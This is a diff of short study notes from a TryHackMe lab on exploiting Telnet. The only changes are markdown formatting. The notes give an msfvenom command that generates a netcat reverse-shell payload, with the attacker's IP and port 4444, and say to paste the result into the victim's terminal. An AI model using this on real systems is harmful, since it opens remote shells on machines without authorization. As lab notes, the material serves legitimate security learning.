@@ -1,5 +1,5 @@
 
-How to generate and encode a netcat reverse shell
+# How to generate and encode a netcat reverse shell
 
 -> msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R       (!! [] note needed when writing IP)
 
@@ -9,5 +9,6 @@ I wil generate a command line you'll need to add in the terminal of the victim. 
 
 THEN paste the command line obtained from the msfvenom step in the terminal of the victim.
 
-SOURCE : Tryhackme, Network Services, Exploiting Telnet : https://tryhackme.com/room/networkservices
+## Source : 
+Tryhackme, Network Services, Exploiting Telnet : https://tryhackme.com/room/networkservices
 
